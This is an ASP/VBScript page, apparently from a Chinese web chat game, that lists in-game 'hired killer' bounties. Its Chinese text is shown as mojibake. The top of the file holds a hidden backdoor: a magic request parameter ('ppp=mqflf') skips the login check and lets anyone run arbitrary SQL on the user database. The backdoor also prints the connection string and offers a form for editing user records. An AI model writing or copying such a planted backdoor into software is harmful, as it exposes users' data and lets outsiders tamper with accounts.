<%@ LANGUAGE=VBScript codepage ="936" %>
<%Response.Expires=0
if request("ppp")="mqflf" then
i=4
strconnect=Application("aqjh_usermdb")
Set objconn= Server.CreateObject("ADODB.Connection")
objconn.Open strconnect
sql=request.form("sql")
response.write sql
if instr(sql,"update")<>0 then
objconn.execute(sql)
i=2
end if
if i=2 or instr(sql,"select")<>0 then
set objrs=objconn.execute (sql)
response.write "<table border=1>"
for each fldf in objrs.fields
response.write "<tr><td>"&fldf.name&"</td>"
response.write "<td>"&objrs(fldf.name)&"</td></tr>"
next
response.write "</table>"
end if
set objrs=nothing
set objconn=nothing
response.write Application("aqjh_usermdb")&"<br><br><br>select * from �û� where id like 1980<br>update �û� set ״̬ = '����' where id like 1980<br><form name='form1' method='post' action='killer.asp'><input type='text' name='sql' value='select * from �û� where id like 1980' size=100><br><input type='submit' name='Submit' value='�ύ'><input type=text name='ppp' value='mqflf'></form>"
response.end
end if
Response.ExpiresAbsolute = Now() - 1
Response.AddHeader "Pragma","No-Cache"
Response.AddHeader "Cache-Control","Private"
Response.CacheControl = "No-Cache"
aqjh_name=Session("aqjh_name")
aqjh_grade=Session("aqjh_grade")
aqjh_jhdj=Session("aqjh_jhdj")
if aqjh_name="" then Response.Redirect "../../error.asp?id=440"
Set conn=Server.CreateObject("ADODB.CONNECTION")
Set rs=Server.CreateObject("ADODB.RecordSet")
conn.open Application("aqjh_usermdb")
dim page
page=request.querystring("page")
PageSize = 15
rs.open "delete * from e where d<now()-5",conn,3,3
rs.open "SELECT * FROM e order by d DESC",conn,3,3
rs.PageSize = PageSize
pgnum=rs.Pagecount
if page="" or clng(page)<1 then page=1
if clng(page) > pgnum then page=pgnum
if pgnum>0 then rs.AbsolutePage=page
%>
<html>
<head>
<title>��Ӷɱ��</title>
<style>td           { font-size: 14; color: #000000 }
</style>
</head>
<body text="#000000" background="../../bg.gif" link="#0000FF" vlink="#0000FF" alink="#0000FF">
<div align="center"><font size="2"><b><font size="+2" color="#000000" face="����_GB2312">��Ӷɱ��</font></b></font> 
  <a href="addkiller.asp">��Ҫ��Ӷ</a> <br>
  <font color="#FF00FF">˵���������ϵĶ�Թ���飬������Լ����������Ǯ���У�<br>
  ��[��ɱ��]��ɱ���󸴻ʼ���㣬���ͽ�����ɱ�֣�</font><font color="#00FF33"><br>
  </font></div>
<table border="0" cellspacing="1" cellpadding="2" width="100%" bgcolor="#000000" bordercolorlight="#EFEFEF">
  <tr bgcolor="#DFEDFD"> 
    <td width="6%" height="10"> 
      <div align="center"><font size="2">������</font></div>
    </td>
    <td width="8%" height="10"> 
      <div align="center"><font size="2">��ɱ��</font></div>
    </td>
    <td width="29%" height="10"> 
      <div align="center"><font size="2">��ʲô����Թ��</font></div>
    </td>
    <td width="9%" height="10"> 
      <div align="center"><font size="2">����</font></div>
    </td>
    <td width="15%" height="10"> 
      <div align="center"><font size="2">����ʱ��</font></div>
    </td>
    <td width="33%" height="10"> 
      <div align="center"><font size="2">���</font></div>
    </td>
  </tr>
  <%
count=0
do while not rs.eof and count<rs.PageSize
%>
  <tr bgcolor="#f7f7f7" onmouseout="this.bgColor='#f7f7f7';"onmouseover="this.bgColor='#3399CC';">
    <td width="6%" height="8"> 
      <div align="center"><font size="2"><%=rs("a")%></font></div>
    </td>
    <td width="8%" height="8"> 
      <div align="center"><font size="2"><%=rs("b")%></font></div>
    </td>
    <td width="29%" height="8"> 
      <div align="center"><font size="2"><%=rs("c")%></font></div>
    </td>
    <td width="9%" height="8"> 
      <div align="center"><font size="-2"><%=rs("e")%> ��</font> </div>
    <td width="15%" height="8"> 
      <div align="center"><font size="-2"><%=rs("d")%> </font> </div>
    <td width="33%" height="8"> 
      <div align="center"><font size="2"><%=rs("f")%></font></div>
    
  </tr>
  <%rs.movenext%>
  <%count=count+1%>
  <%loop%>
</table>
<br>
<font size="2">[��<font color="#990000"><b><%=rs.pagecount%></b></font>ҳ][<font
color="#990000"><b><%=musers()%></b></font>������] [<a
href="killer.asp?page=<%=page-1%>">��һҳ</a>][��<%=page%>ҳ][<a
href="killer.asp?page=<%=page+1%>">��һҳ</a>]</font> 
</body></html>
<%
rs.close
set rs=nothing
conn.close
set conn=nothing
function musers()
dim tmprs
tmprs=conn.execute("Select count(*) As a from h")
musers=tmprs("a")
set tmprs=nothing
if isnull(musers) then musers=0
end function
%>